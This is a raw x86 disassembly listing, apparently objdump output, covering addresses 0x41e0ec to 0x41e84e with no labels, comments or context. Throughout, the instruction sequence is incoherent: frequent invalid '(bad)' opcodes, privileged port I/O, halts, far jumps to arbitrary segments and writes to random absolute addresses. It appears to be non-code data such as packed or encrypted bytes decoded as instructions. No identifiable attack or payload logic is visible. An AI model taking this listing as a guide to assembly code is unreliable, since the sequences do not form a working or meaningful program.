  41e0ec:	or     bh,BYTE PTR [ebp+ebx*8-0x26]
  41e0f0:	lds    ebp,FWORD PTR [ecx]
  41e0f2:	adc    dl,BYTE PTR [ebx]
  41e0f4:	fstp   DWORD PTR [ebx]
  41e0f6:	xchg   edi,eax
  41e0f7:	js     0x41e0b2
  41e0f9:	add    eax,0x28884a38
  41e0fe:	sub    edi,edx
  41e100:	pushf  
  41e101:	add    BYTE PTR [edi],al
  41e103:	bound  ebp,QWORD PTR [edi+0x6b403f8e]
  41e109:	(bad)  
  41e10a:	xchg   ecx,eax
  41e10b:	push   edi
  41e10c:	stos   BYTE PTR es:[edi],al
  41e10d:	jnp    0x41e0fa
  41e10f:	(bad)  
  41e111:	imul   edx,esi,0xffffffe3
  41e114:	icebp  
  41e115:	lahf   
  41e116:	nop
  41e117:	cs or  al,0x29
  41e11a:	sbb    DWORD PTR [edi+0x66],0x144cb130
  41e121:	test   BYTE PTR [esi],0xf3
  41e124:	jbe    0x41e133
  41e126:	js     0x41e0b9
  41e128:	in     eax,0x98
  41e12a:	nop
  41e12b:	(bad)  
  41e12c:	shl    BYTE PTR [eax],1
  41e12e:	icebp  
  41e12f:	repz pusha 
  41e131:	pop    esi
  41e132:	scas   eax,DWORD PTR es:[edi]
  41e133:	dec    edx
  41e134:	jno    0x41e0d1
  41e136:	stos   DWORD PTR es:[edi],eax
  41e137:	outs   dx,BYTE PTR ds:[esi]
  41e138:	jns    0x41e19c
  41e13a:	or     BYTE PTR [edx],ch
  41e13c:	scas   eax,DWORD PTR es:[edi]
  41e13d:	imul   edx,DWORD PTR [eax+0x3eec0ecb],0xffffffe1
  41e144:	shl    BYTE PTR [edx],1
  41e146:	jmp    0x786acaab
  41e14b:	dec    edx
  41e14c:	cmc    
  41e14d:	mov    DWORD PTR ds:0xaf12989c,eax
  41e153:	push   esp
  41e154:	jb     0x41e165
  41e156:	push   eax
  41e157:	js     0x41e0e9
  41e159:	cmc    
  41e15a:	add    BYTE PTR [eax-0x57a058a],ah
  41e160:	mov    dh,0x9d
  41e162:	cmc    
  41e163:	dec    esi
  41e164:	mov    ch,0xcc
  41e166:	cmp    edi,DWORD PTR [esi+0x6fa2129c]
  41e16c:	loop   0x41e199
  41e16e:	push   eax
  41e16f:	pop    es
  41e170:	jb     0x41e108
  41e172:	and    DWORD PTR [ecx],0x375aec90
  41e178:	mov    cl,0xd4
  41e17a:	cld    
  41e17b:	in     al,dx
  41e17c:	mov    esp,DWORD PTR [edi]
  41e17e:	lahf   
  41e17f:	mov    ebp,0xa1669b8
  41e184:	and    ch,0x5e
  41e187:	(bad)  
  41e188:	jne    0x41e168
  41e18a:	push   ecx
  41e18b:	push   ebx
  41e18c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e18d:	and    edi,DWORD PTR [edi*4-0x556fbe2c]
  41e194:	and    BYTE PTR [eax-0x16],0x75
  41e198:	mov    esi,0xc64a62b9
  41e19d:	push   ebx
  41e19e:	xchg   DWORD PTR ds:0xe3a724fa,ecx
  41e1a4:	sahf   
  41e1a5:	jae    0x41e1c6
  41e1a7:	cmp    eax,0x39b147c4
  41e1ac:	mov    ch,0x1
  41e1ae:	jge    0x41e1dc
  41e1b0:	jo     0x41e190
  41e1b2:	pop    esi
  41e1b3:	jo     0x41e21d
  41e1b5:	cmp    BYTE PTR [ebp+0x65],ch
  41e1b8:	icebp  
  41e1b9:	loopne 0x41e14a
  41e1bb:	xchg   BYTE PTR [ecx],cl
  41e1bd:	jmp    0x6e3c5979
  41e1c2:	jecxz  0x41e229
  41e1c4:	push   0x68
  41e1c6:	dec    edi
  41e1c7:	mov    bh,BYTE PTR [edi+0x35]
  41e1ca:	push   ebp
  41e1cb:	pop    edx
  41e1cc:	in     al,0xa7
  41e1ce:	nop
  41e1cf:	cdq    
  41e1d0:	push   0x2f42bbfa
  41e1d5:	fisttp DWORD PTR [edi]
  41e1d7:	mov    BYTE PTR [ebx-0x61],dh
  41e1da:	adc    BYTE PTR [ebp-0x3],dl
  41e1dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1de:	xchg   esi,eax
  41e1df:	data16 jle 0x41e17d
  41e1e2:	lock je 0x41e19a
  41e1e5:	clc    
  41e1e6:	mov    ds:0x5eddfe02,al
  41e1eb:	les    ebp,FWORD PTR [edx]
  41e1ed:	add    esi,DWORD PTR [ebx-0x700ff9fb]
  41e1f3:	mov    esi,0xc0b9d29
  41e1f8:	xchg   edx,eax
  41e1f9:	and    al,0x64
  41e1fb:	dec    edx
  41e1fc:	jbe    0x41e25d
  41e1fe:	xchg   edx,eax
  41e1ff:	shr    DWORD PTR [bx+si],0xfc
  41e203:	clc    
  41e204:	fwait
  41e205:	xchg   ebx,eax
  41e206:	push   ds
  41e207:	add    al,0x8f
  41e209:	cli    
  41e20a:	fisttp QWORD PTR [eax-0x40ee2156]
  41e210:	loopne 0x41e1e4
  41e212:	inc    eax
  41e213:	sbb    al,0x2
  41e215:	push   cs
  41e216:	jmp    0x7fe484c2
  41e21b:	xchg   esp,eax
  41e21c:	or     DWORD PTR [eax-0x6f],esi
  41e21f:	jo     0x41e211
  41e221:	push   ebp
  41e222:	outs   dx,DWORD PTR ds:[esi]
  41e223:	retf   0x93c6
  41e226:	daa    
  41e227:	das    
  41e228:	xchg   edi,eax
  41e229:	jbe    0x41e20c
  41e22b:	dec    ebp
  41e22c:	and    cl,bl
  41e22e:	sub    ah,BYTE PTR [esi]
  41e230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e231:	popf   
  41e232:	inc    edx
  41e233:	or     bh,cl
  41e235:	test   BYTE PTR [edi+0x12617c04],0x16
  41e23c:	cwde   
  41e23d:	fwait
  41e23e:	and    al,0x4a
  41e240:	nop
  41e241:	or     bl,dh
  41e243:	ins    DWORD PTR es:[edi],dx
  41e244:	adc    al,0x78
  41e246:	mov    ds:0x951a9ba6,eax
  41e24b:	lds    eax,FWORD PTR [ebp+0x74f8ef48]
  41e251:	fidivr WORD PTR [ebx]
  41e253:	mov    eax,ds:0xfffb37c8
  41e258:	lahf   
  41e259:	mov    eax,ds:0x8ad78f90
  41e25e:	sbb    al,0xc9
  41e260:	nop
  41e261:	std    
  41e262:	inc    eax
  41e263:	pop    ecx
  41e264:	add    DWORD PTR [ebx],0xb27c4c77
  41e26a:	push   edi
  41e26b:	jp     0x41e256
  41e26d:	fidivr DWORD PTR [edi-0x6fa87bdb]
  41e273:	sub    eax,0x7b714ffe
  41e278:	scas   al,BYTE PTR es:[edi]
  41e279:	lods   eax,DWORD PTR ds:[esi]
  41e27a:	mov    edx,0x552dab49
  41e27f:	gs pushf 
  41e281:	dec    eax
  41e282:	add    bh,bh
  41e284:	fwait
  41e285:	jb     0x41e2f1
  41e287:	inc    edx
  41e288:	lock in eax,0xa6
  41e28b:	sub    BYTE PTR [edx-0x19],0x34
  41e28f:	and    bh,BYTE PTR [ecx+0x17]
  41e292:	adc    BYTE PTR [edi+0x58],bl
  41e295:	pop    ebx
  41e296:	adc    al,0xfa
  41e298:	fwait
  41e299:	(bad)  
  41e29a:	mov    al,ds:0xa2e1e328
  41e29f:	sub    eax,0xb288ddd6
  41e2a4:	jle    0x41e24c
  41e2a6:	scas   al,BYTE PTR es:[edi]
  41e2a7:	test   eax,0xbd9ebaa8
  41e2ac:	xor    al,0xf
  41e2ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2af:	or     DWORD PTR [eax+0x5d],esi
  41e2b2:	cmp    BYTE PTR [ecx+0x947de0c],0x25
  41e2b9:	je     0x41e29b
  41e2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2bc:	cmp    dl,BYTE PTR [eax+0x7c]
  41e2bf:	mov    bl,BYTE PTR [ebx+0x30873b80]
  41e2c5:	out    dx,al
  41e2c6:	mov    dh,0x3b
  41e2c8:	aad    0xeb
  41e2ca:	fimul  WORD PTR [edi]
  41e2cc:	and    BYTE PTR [ecx],dl
  41e2ce:	nop
  41e2cf:	jmp    0x19b:0xf59d6ed7
  41e2d6:	jmp    0x1eef:0x5cb5240a
  41e2dd:	ficom  WORD PTR [ebx+esi*4+0x2f5febcf]
  41e2e4:	mov    ebx,0xe9a7a3b7
  41e2e9:	mov    edi,0xebd60f70
  41e2ee:	hlt    
  41e2ef:	sar    DWORD PTR [eax],cl
  41e2f1:	scas   eax,DWORD PTR es:[edi]
  41e2f2:	xor    BYTE PTR [ecx],cl
  41e2f4:	pop    edi
  41e2f5:	pop    ecx
  41e2f6:	xchg   ecx,eax
  41e2f7:	fmul   st,st(0)
  41e2f9:	(bad)  
  41e2fa:	xor    dl,cl
  41e2fc:	adc    bh,BYTE PTR [eax+esi*2+0x78f5d558]
  41e303:	pop    ebx
  41e304:	das    
  41e305:	mov    ah,0x7a
  41e307:	retf   
  41e308:	fwait
  41e309:	mov    esp,0xf37c373
  41e30e:	sbb    DWORD PTR [ecx+0x70],eax
  41e311:	fisubr WORD PTR [edi-0xb]
  41e314:	fucom  st(0)
  41e316:	push   0xae416937
  41e31b:	pushf  
  41e31c:	xchg   BYTE PTR [eax-0x3f5d5f70],dh
  41e322:	pop    ss
  41e323:	xchg   esp,esp
  41e325:	fnsave [ecx+0x5ff2933b]
  41e32b:	sbb    BYTE PTR [eax+0x44],bl
  41e32e:	xchg   edx,eax
  41e32f:	xchg   esi,eax
  41e330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e331:	outs   dx,DWORD PTR ds:[esi]
  41e332:	adc    eax,0xc23ddc66
  41e337:	mov    ecx,0x4001dde9
  41e33c:	add    edx,DWORD PTR ds:0x643cc4d9
  41e342:	or     al,0xcc
  41e344:	pushf  
  41e345:	retf   
  41e346:	mov    cl,0x12
  41e348:	(bad)  
  41e34a:	cmp    BYTE PTR [edx+0x73],dl
  41e34d:	add    eax,0xe14dc572
  41e352:	icebp  
  41e353:	jmp    0xab63:0xc57ffb54
  41e35a:	lock jb 0x41e2ff
  41e35d:	and    al,0x67
  41e35f:	mov    ds:0xa97034d4,eax
  41e364:	pop    edi
  41e365:	pop    edi
  41e366:	jns    0x41e301
  41e368:	sub    bl,dl
  41e36a:	cmp    DWORD PTR [ebp+0x34],ecx
  41e36d:	(bad)  
  41e36f:	test   BYTE PTR [ecx],0xae
  41e372:	xor    eax,0x7dcdd379
  41e377:	dec    edx
  41e378:	or     eax,0xf9172b23
  41e37d:	mov    bh,0xfb
  41e37f:	setnp  BYTE PTR [ecx]
  41e382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e383:	inc    ebp
  41e384:	jo     0x41e353
  41e386:	add    al,0xff
  41e388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e389:	push   ss
  41e38a:	pusha  
  41e38b:	cmp    bl,BYTE PTR [ebx]
  41e38d:	fld    TBYTE PTR [ecx+0x5d39624d]
  41e393:	lea    esi,[edi+0x1b9f6ebd]
  41e399:	dec    esp
  41e39a:	xchg   esi,eax
  41e39b:	xchg   dh,dl
  41e39d:	sub    bl,BYTE PTR [edi]
  41e39f:	mov    ebp,0xf737de6d
  41e3a4:	mul    BYTE PTR [edi+0x48]
  41e3a7:	xchg   ecx,eax
  41e3a8:	inc    edi
  41e3a9:	iret   
  41e3aa:	xchg   ecx,eax
  41e3ab:	push   edi
  41e3ac:	les    ebx,FWORD PTR [edi-0x2b]
  41e3af:	adc    al,0x2a
  41e3b1:	mov    edx,0x15f13084
  41e3b6:	push   ecx
  41e3b7:	push   ss
  41e3b8:	sbb    esi,ecx
  41e3ba:	(bad)  
  41e3bb:	in     al,0x8
  41e3bd:	lea    edi,[ebx-0x64]
  41e3c0:	xchg   ecx,eax
  41e3c1:	clc    
  41e3c2:	(bad)  
  41e3c3:	sahf   
  41e3c4:	pop    edi
  41e3c5:	loope  0x41e376
  41e3c7:	xor    DWORD PTR [ebx+0x5a],eax
  41e3ca:	ror    DWORD PTR [ecx+0x33],0xed
  41e3ce:	mov    al,0x87
  41e3d0:	pop    esp
  41e3d1:	in     eax,0x39
  41e3d3:	add    eax,0x4a7e20d8
  41e3d8:	(bad)  
  41e3d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3da:	loope  0x41e3cd
  41e3dc:	and    dl,BYTE PTR [edi+0x4c]
  41e3df:	dec    edx
  41e3e0:	fmul   DWORD PTR [edi+0x1fd9c495]
  41e3e6:	pop    ecx
  41e3e7:	das    
  41e3e8:	lods   eax,DWORD PTR ds:[esi]
  41e3e9:	fidiv  DWORD PTR [edi]
  41e3eb:	and    eax,0xee3a119b
  41e3f0:	lock pop ecx
  41e3f2:	inc    esp
  41e3f3:	addr16 sub ebp,edx
  41e3f6:	cmp    eax,0x59e1a00a
  41e3fb:	mov    ecx,DWORD PTR [esi-0x75]
  41e3fe:	xchg   edi,eax
  41e3ff:	push   edi
  41e400:	sub    DWORD PTR [eiz*8-0x2f951455],edx
  41e407:	pop    esp
  41e408:	inc    ecx
  41e409:	pop    eax
  41e40a:	or     al,0x4a
  41e40c:	mov    esp,DWORD PTR [esi+0x79959dde]
  41e412:	pop    esp
  41e413:	mov    DWORD PTR [edi-0x46075301],esi
  41e419:	jp     0x41e472
  41e41b:	test   DWORD PTR [esi+0x744ddffa],eax
  41e421:	push   ebp
  41e422:	push   esi
  41e423:	push   ebx
  41e424:	iret   
  41e425:	sti    
  41e426:	addr16 adc al,0x97
  41e429:	push   0xffffff90
  41e42b:	mov    bl,0x2b
  41e42d:	rcr    bl,cl
  41e42f:	xchg   ebx,eax
  41e430:	lods   eax,DWORD PTR ds:[esi]
  41e431:	mov    edi,0xde8d2c0e
  41e436:	mov    eax,0xfd112786
  41e43b:	loopne 0x41e486
  41e43d:	(bad)  
  41e43e:	xchg   ecx,eax
  41e43f:	fs addr16 jp 0x41e41a
  41e443:	fdivp  st(1),st
  41e445:	or     ah,BYTE PTR [ecx-0x6d]
  41e448:	outs   dx,DWORD PTR ds:[esi]
  41e449:	(bad)  
  41e44a:	xchg   al,cl
  41e44c:	call   0x36bfd2e
  41e451:	mov    bl,0x18
  41e453:	inc    esi
  41e454:	int    0x8f
  41e456:	nop
  41e457:	mov    ah,0xa9
  41e459:	cdq    
  41e45a:	pop    edi
  41e45b:	xlat   BYTE PTR ds:[ebx]
  41e45c:	or     edx,esi
  41e45e:	popa   
  41e45f:	push   ecx
  41e460:	sbb    dl,BYTE PTR [edx+0x2e7d7a25]
  41e466:	and    ah,cl
  41e468:	fbld   TBYTE PTR [ebp+0x4ed7a491]
  41e46e:	mov    al,ds:0x65363e4a
  41e473:	sbb    esi,DWORD PTR [eax-0x68]
  41e476:	mov    al,ah
  41e478:	pop    ss
  41e479:	ficom  WORD PTR [ecx-0x68454b00]
  41e47f:	ss cli 
  41e481:	(bad)  
  41e482:	nop
  41e483:	xchg   DWORD PTR [edx+0x18],ecx
  41e486:	pushf  
  41e487:	add    DWORD PTR [eax-0x59b5ba75],ebp
  41e48d:	push   cs
  41e48e:	(bad)  
  41e48f:	js     0x41e414
  41e491:	(bad)  
  41e492:	(bad)  
  41e493:	cwde   
  41e494:	fwait
  41e495:	pusha  
  41e496:	or     eax,0x7ac18277
  41e49b:	and    eax,0xda0ade66
  41e4a0:	popf   
  41e4a1:	inc    edi
  41e4a2:	jns    0x41e51a
  41e4a4:	mov    BYTE PTR [eax],cl
  41e4a6:	nop
  41e4a7:	or     eax,0xdd90fd6b
  41e4ac:	xor    ebp,esi
  41e4ae:	xor    DWORD PTR [ebp-0x7e],ecx
  41e4b1:	pop    ds
  41e4b2:	adc    eax,0x6061e5ef
  41e4b7:	mov    al,BYTE PTR [esi-0x661b701c]
  41e4bd:	imul   edx,DWORD PTR [edi+0x77],0x4afd4f34
  41e4c4:	xchg   ebx,eax
  41e4c5:	jge    0x41e4de
  41e4c7:	inc    ecx
  41e4c8:	cmp    al,0x3f
  41e4ca:	outs   dx,DWORD PTR ds:[esi]
  41e4cb:	adc    ah,BYTE PTR [ebp-0x428d5236]
  41e4d1:	jg     0x41e463
  41e4d3:	std    
  41e4d4:	jmp    0xc2aab8f
  41e4d9:	sti    
  41e4da:	mov    es,WORD PTR [ebx+0x26891e95]
  41e4e0:	(bad)  
  41e4e2:	hlt    
  41e4e3:	lds    ebx,FWORD PTR [ebx+0x7671b2fe]
  41e4e9:	dec    esp
  41e4ea:	gs mov dh,0x60
  41e4ed:	loope  0x41e505
  41e4ef:	ins    BYTE PTR es:[edi],dx
  41e4f0:	imul   esp,DWORD PTR [edi-0x73],0x17
  41e4f4:	inc    ebx
  41e4f5:	sub    edx,DWORD PTR [ebp+edx*2-0x5e]
  41e4f9:	push   ebx
  41e4fa:	pop    esp
  41e4fb:	pop    edi
  41e4fc:	(bad)  
  41e4fd:	mov    bh,0x61
  41e4ff:	aad    0x59
  41e501:	or     eax,0xddb984f0
  41e506:	ret    0x9998
  41e509:	test   al,0xd5
  41e50b:	(bad)  
  41e50c:	adc    edx,esp
  41e50e:	xchg   edi,eax
  41e50f:	imul   ebx,DWORD PTR [ecx],0xffffffb2
  41e512:	sbb    eax,0x42cd3b3c
  41e517:	xor    eax,DWORD PTR [ebp-0x22]
  41e51a:	adc    DWORD PTR [edi-0x23888284],eax
  41e520:	rol    BYTE PTR [ebx-0x51],0x8f
  41e524:	(bad)  
  41e525:	lock (bad) 
  41e527:	jnp    0x41e4c5
  41e529:	add    DWORD PTR [edi-0x49],eax
  41e52c:	xchg   esp,eax
  41e52d:	ficom  WORD PTR [ebx-0x69c1e102]
  41e533:	lock das 
  41e535:	clc    
  41e536:	add    DWORD PTR [edx+0x69cf5e9b],edx
  41e53c:	mov    eax,0xeccd97d5
  41e541:	in     al,dx
  41e542:	push   ebx
  41e543:	inc    ebp
  41e544:	mov    DWORD PTR [eax+esi*8],0x25e70cd2
  41e54b:	or     bl,BYTE PTR [ebx+0x7e8381bb]
  41e551:	mov    edx,0xddefb5d6
  41e556:	nop
  41e557:	ror    DWORD PTR [ecx-0x39],cl
  41e55a:	add    DWORD PTR [ebp+0x352840a9],ecx
  41e560:	pushf  
  41e561:	scas   al,BYTE PTR es:[edi]
  41e562:	jmp    0x41e586
  41e564:	retf   
  41e565:	(bad)  
  41e566:	xor    BYTE PTR ds:0x4a01f46b,bh
  41e56c:	sbb    al,0xe9
  41e56e:	test   eax,0xa78f9cb1
  41e573:	cmc    
  41e574:	fwait
  41e575:	pushf  
  41e576:	(bad)  
  41e577:	sbb    dh,bh
  41e579:	sub    eax,0xde2c460e
  41e57e:	sti    
  41e57f:	or     cl,BYTE PTR [ebp+0x77e765a9]
  41e585:	lods   al,BYTE PTR ds:[esi]
  41e586:	nop
  41e587:	sar    DWORD PTR [edx-0x7e8dc743],cl
  41e58d:	das    
  41e58e:	cmp    ebp,DWORD PTR [edx]
  41e590:	and    bl,dh
  41e592:	dec    esi
  41e593:	sub    al,0xbb
  41e595:	mov    al,ds:0xf4b57bf3
  41e59a:	jg     0x41e51e
  41e59c:	fdiv   QWORD PTR [ebx]
  41e59f:	add    BYTE PTR [edx-0x795b4cdc],ah
  41e5a5:	fidivr WORD PTR [edx+eiz*8-0x79]
  41e5a9:	push   ecx
  41e5aa:	and    edi,DWORD PTR [edi-0x29]
  41e5ad:	cmp    al,0x90
  41e5af:	pop    es
  41e5b0:	cmp    DWORD PTR [ebx+0x4a],0xac0cad3f
  41e5b7:	push   0xca147d10
  41e5bc:	addr16 loop 0x41e57c
  41e5bf:	mov    ds:0xd19351c6,al
  41e5c4:	cmp    eax,edi
  41e5c6:	loop   0x41e5bf
  41e5c8:	cwde   
  41e5c9:	scas   al,BYTE PTR es:[edi]
  41e5ca:	fdiv   QWORD PTR [edi]
  41e5cc:	arpl   si,bx
  41e5ce:	imul   esi,DWORD PTR [edx-0x35],0xffffffcd
  41e5d2:	jnp    0x41e5b3
  41e5d4:	sbb    al,0x66
  41e5d6:	or     eax,0x1d40aa3d
  41e5db:	xchg   edi,eax
  41e5dc:	int3   
  41e5dd:	popf   
  41e5de:	idiv   BYTE PTR [edi]
  41e5e0:	in     al,0x38
  41e5e2:	ret    
  41e5e3:	dec    esi
  41e5e4:	sub    ah,BYTE PTR [ebx-0x3e]
  41e5e7:	mov    al,0x64
  41e5e9:	sahf   
  41e5ea:	lods   al,BYTE PTR ds:[esi]
  41e5eb:	mov    ds:0xccdc268,al
  41e5f0:	mov    eax,ds:0xaf53dadd
  41e5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5f6:	in     eax,dx
  41e5f7:	and    eax,0xc33de48
  41e5fc:	mov    ebp,0xa8d0274
  41e601:	(bad)  
  41e602:	nop
  41e603:	pop    eax
  41e604:	fbld   TBYTE PTR [esi]
  41e606:	cwde   
  41e607:	rol    DWORD PTR [eax],cl
  41e609:	fldenv [edi+edx*4-0x14]
  41e60d:	in     al,0x39
  41e60f:	clc    
  41e610:	jnp    0x41e5c5
  41e612:	xchg   esp,eax
  41e613:	pop    ecx
  41e614:	mov    DWORD PTR [edx+ebx*8],esi
  41e617:	pop    ebp
  41e618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e619:	dec    edx
  41e61a:	cmp    DWORD PTR [ebx+0x43],0xffffffdf
  41e61e:	mov    dl,0x2c
  41e620:	or     ah,BYTE PTR [edx]
  41e622:	ins    BYTE PTR es:[edi],dx
  41e623:	push   cs
  41e624:	push   ebx
  41e625:	fimul  WORD PTR [edx]
  41e627:	mov    ah,BYTE PTR [eax+0x70691613]
  41e62d:	stos   DWORD PTR es:[edi],eax
  41e62e:	mov    esp,0xae77aa10
  41e633:	scas   eax,DWORD PTR es:[edi]
  41e634:	shl    esp,cl
  41e636:	cmp    dl,ah
  41e638:	inc    edi
  41e639:	xchg   ebx,eax
  41e63a:	xor    BYTE PTR [ebx+edi*1+0x8],bl
  41e63e:	xchg   esp,eax
  41e63f:	and    bh,0x65
  41e642:	push   ds
  41e643:	fidivr DWORD PTR ds:0x9b8e419a
  41e649:	mov    esp,ebx
  41e64b:	xchg   esp,eax
  41e64c:	lods   al,BYTE PTR ds:[esi]
  41e64d:	xor    DWORD PTR [ebx+esi*2],eax
  41e650:	(bad)  
  41e651:	in     al,0xe4
  41e653:	dec    esi
  41e654:	xor    cl,ch
  41e656:	test   eax,0x874e7989
  41e65b:	mov    al,ds:0x64ee619b
  41e660:	popa   
  41e661:	cs dec edx
  41e663:	xchg   edi,eax
  41e664:	clc    
  41e665:	int    0xcc
  41e667:	dec    ecx
  41e668:	add    DWORD PTR [edx],0xf679c6e4
  41e66e:	out    0x5b,eax
  41e670:	fwait
  41e671:	cmp    eax,edx
  41e673:	xchg   ebx,eax
  41e674:	dec    ecx
  41e675:	add    al,0xca
  41e677:	mov    ebp,0xbf9fda25
  41e67c:	add    al,0xde
  41e67e:	repz aam 0x14
  41e681:	cmp    DWORD PTR [ecx+0x74],ecx
  41e684:	jmp    0xdf:0x7ba190be
  41e68b:	adc    BYTE PTR [edi],dl
  41e68d:	xchg   BYTE PTR [ecx+0x4d],ch
  41e690:	mov    bl,0xbb
  41e692:	jmp    0x1a09:0x383a7554
  41e699:	sub    al,0x90
  41e69b:	and    al,0x2a
  41e69d:	inc    ecx
  41e69e:	cmc    
  41e69f:	icebp  
  41e6a0:	icebp  
  41e6a1:	push   0x3a
  41e6a3:	dec    edx
  41e6a4:	scas   al,BYTE PTR es:[edi]
  41e6a5:	aad    0x8c
  41e6a7:	icebp  
  41e6a8:	push   ss
  41e6a9:	rcl    DWORD PTR [edi+0x5e],0x8b
  41e6ad:	js     0x41e63f
  41e6af:	in     eax,0x96
  41e6b1:	dec    edx
  41e6b2:	out    0xbd,al
  41e6b4:	jp     0x41e6b7
  41e6b6:	and    eax,0xf4512858
  41e6bb:	or     bh,BYTE PTR [ebx+0x57]
  41e6be:	xchg   DWORD PTR [ecx],eax
  41e6c0:	ins    DWORD PTR es:[edi],dx
  41e6c1:	aaa    
  41e6c2:	int3   
  41e6c3:	and    al,0xc3
  41e6c5:	jnp    0x41e71d
  41e6c7:	fist   DWORD PTR es:[ebx]
  41e6ca:	jl     0x41e65d
  41e6cc:	jo     0x41e71a
  41e6ce:	jp     0x41e695
  41e6d0:	into   
  41e6d1:	loope  0x41e660
  41e6d3:	(bad)  [esi-0x3bf58e84]
  41e6d9:	aas    
  41e6da:	mov    dl,0xaf
  41e6dc:	mov    edx,0x5b938c25
  41e6e1:	xor    ch,BYTE PTR [ecx]
  41e6e3:	mov    eax,ds:0x4a3d0aeb
  41e6e8:	push   ds
  41e6e9:	jno    0x41e6b7
  41e6eb:	inc    ch
  41e6ed:	jl     0x41e68e
  41e6ef:	bound  ebx,QWORD PTR [ebx-0x43244ab2]
  41e6f5:	sbb    al,0xec
  41e6f7:	inc    ecx
  41e6f8:	pop    es
  41e6f9:	jecxz  0x41e69b
  41e6fb:	mov    dl,0x60
  41e6fd:	(bad)  
  41e6fe:	aad    0x67
  41e700:	cs lahf 
  41e702:	sti    
  41e703:	jp     0x41e771
  41e705:	mov    BYTE PTR [eax+0x2f],cl
  41e708:	dec    ebx
  41e709:	mov    al,0x5
  41e70c:	mov    DWORD PTR [eax+0x64],0x8ac49b2d
  41e713:	dec    esi
  41e714:	jp     0x41e727
  41e716:	adc    cl,BYTE PTR [edx+0x78]
  41e719:	data16 ror BYTE PTR [ebp+0x540fca0d],cl
  41e720:	mov    edx,0x1bb5edf2
  41e725:	dec    ecx
  41e726:	sub    dh,ah
  41e728:	shl    DWORD PTR [ebx-0x37c7c403],0x38
  41e72f:	dec    esp
  41e730:	xor    eax,0x88646418
  41e735:	push   esp
  41e736:	rep stos BYTE PTR es:[edi],al
  41e738:	sub    edi,DWORD PTR [edx+0x699b864d]
  41e73e:	imul   eax
  41e740:	icebp  
  41e741:	inc    ecx
  41e742:	dec    eax
  41e743:	add    DWORD PTR [ebx-0xc],0xd93cf695
  41e74a:	lods   al,BYTE PTR ds:[esi]
  41e74b:	ds fwait
  41e74d:	push   esi
  41e74e:	rcl    BYTE PTR [ebp+edx*2+0x204a72d9],0x24
  41e756:	mov    edx,0x26f2247e
  41e75b:	sbb    eax,0x3e82b8af
  41e760:	xchg   esp,eax
  41e761:	std    
  41e762:	popf   
  41e763:	fistp  WORD PTR [ebx-0x26]
  41e766:	sbb    al,0x9d
  41e768:	pop    es
  41e769:	jmp    0x6c51:0x603c49dd
  41e770:	mov    al,ds:0x9b48b4af
  41e775:	test   eax,esi
  41e777:	xchg   al,cl
  41e779:	cmp    DWORD PTR [esp+esi*8],edi
  41e77c:	sbb    dh,bl
  41e77e:	xchg   DWORD PTR [eax-0x382f348],ebp
  41e784:	inc    esi
  41e785:	and    eax,0xd6b67990
  41e78a:	loopne 0x41e70f
  41e78c:	iret   
  41e78d:	push   0xffffffbd
  41e78f:	push   0x49a45e4a
  41e794:	dec    edi
  41e795:	(bad)  
  41e796:	fwait
  41e797:	loop   0x41e75c
  41e799:	jge    0x41e72b
  41e79b:	and    BYTE PTR [ebp+edx*1-0x419df3af],0x5f
  41e7a3:	dec    edx
  41e7a4:	and    DWORD PTR [edi],esi
  41e7a6:	fstp   DWORD PTR [eax-0x56ecb31e]
  41e7ac:	fwait
  41e7ad:	mov    bl,0xa6
  41e7af:	out    0x46,eax
  41e7b1:	test   DWORD PTR ds:0xdffa4dc6,0x1a9e748d
  41e7bb:	sub    BYTE PTR [ebp-0x42],ch
  41e7be:	jp     0x41e815
  41e7c0:	fwait
  41e7c1:	xchg   edi,eax
  41e7c2:	add    BYTE PTR [ebx-0x12],dh
  41e7c5:	test   ecx,esi
  41e7c7:	sbb    edx,0x84ae86dd
  41e7cd:	adc    ch,BYTE PTR [eax-0x6f3a18ad]
  41e7d3:	(bad)  
  41e7d4:	and    al,0x59
  41e7d6:	adc    ebx,DWORD PTR [ecx+0x4a7fac45]
  41e7dc:	dec    edi
  41e7dd:	stc    
  41e7de:	aad    0x8a
  41e7e0:	test   al,0x8e
  41e7e2:	loope  0x41e7b7
  41e7e4:	fwait
  41e7e5:	sub    ebp,DWORD PTR [esi]
  41e7e7:	push   ebx
  41e7e8:	sbb    eax,0x697771f4
  41e7ed:	(bad)  
  41e7ee:	pop    ebx
  41e7ef:	push   0xcf4c97ad
  41e7f4:	lahf   
  41e7f5:	cmp    DWORD PTR [ecx-0x72e8a40b],eax
  41e7fb:	in     al,dx
  41e7fc:	(bad)  
  41e7fe:	cs adc al,0x6f
  41e801:	inc    esi
  41e802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e803:	and    dx,bp
  41e806:	pusha  
  41e807:	mov    edx,0x9f0f6b78
  41e80c:	leave  
  41e80d:	mov    al,ds:0x4c9bc4a3
  41e812:	xor    eax,0xab595755
  41e817:	dec    edx
  41e818:	push   cs
  41e819:	or     eax,0xc9566039
  41e81e:	jo     0x41e88a
  41e820:	mov    bl,0xc2
  41e822:	nop
  41e823:	and    ah,BYTE PTR [edx+ebp*8]
  41e826:	xchg   ecx,eax
  41e827:	retf   
  41e828:	jns    0x41e7fd
  41e82a:	imul   ecx,DWORD PTR [edx+0x23],0xd
  41e82e:	xchg   BYTE PTR [edi-0x371dbce4],ah
  41e834:	aad    0xb
  41e836:	cmp    ecx,ebx
  41e838:	ss fcom st(5)
  41e83b:	pop    ss
  41e83c:	std    
  41e83d:	add    BYTE PTR [edx+ecx*4+0x63],ah
  41e841:	ficomp WORD PTR [ebx+eiz*4+0x5d]
  41e845:	retf   
  41e846:	leave  
  41e847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e848:	mov    bh,0xa3
  41e84a:	nop
  41e84b:	fbstp  TBYTE PTR [edx]
  41e84d:	in     al,dx
  41e84e:	lahf   
